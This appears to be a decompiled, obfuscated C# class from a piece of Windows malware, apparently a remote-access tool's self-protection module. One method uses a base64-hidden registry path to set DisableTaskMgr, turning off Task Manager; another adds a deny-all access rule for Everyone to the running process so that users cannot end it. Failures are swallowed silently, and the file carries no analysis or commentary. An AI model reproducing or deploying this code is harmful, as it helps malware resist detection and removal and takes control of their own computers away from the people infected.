using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace nLpTFjJRwUBp;

internal class gsahLIimhbGVo
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr qgWTEnsRShQHI, int VohcEIAgGwiC, [Out] byte[] CqxlIUWDvv, uint TdwUgDfzXcg, out uint IdgSnbeOrgiQ);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr lMnohtWxGpRzJ, int JAGrdLJJczJI, [In] byte[] bspLoQXLGLeLWc);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void GNPoFVKoMIyV(bool zMjxzrslJThYY)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			registryKey.SetValue(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor bwccqGnUOZBM(IntPtr lcLJQQMfHU)
	{
		byte[] cqxlIUWDvv = new byte[0];
		GetKernelObjectSecurity(lcLJQQMfHU, 4, cqxlIUWDvv, 0u, out var IdgSnbeOrgiQ);
		if ((long)IdgSnbeOrgiQ > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(lcLJQQMfHU, 4, cqxlIUWDvv = new byte[IdgSnbeOrgiQ], IdgSnbeOrgiQ, out IdgSnbeOrgiQ))
		{
			return null;
		}
		return new RawSecurityDescriptor(cqxlIUWDvv, 0);
	}

	private void yOVDmdOmTWsT(IntPtr OUozbXWzXFYYJ, RawSecurityDescriptor tAHeJzdmJf)
	{
		byte[] array = new byte[tAHeJzdmJf.BinaryLength];
		tAHeJzdmJf.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(OUozbXWzXFYYJ, 4, array);
	}

	public void ojJWKiDpypINPz()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = bwccqGnUOZBM(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			yOVDmdOmTWsT(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
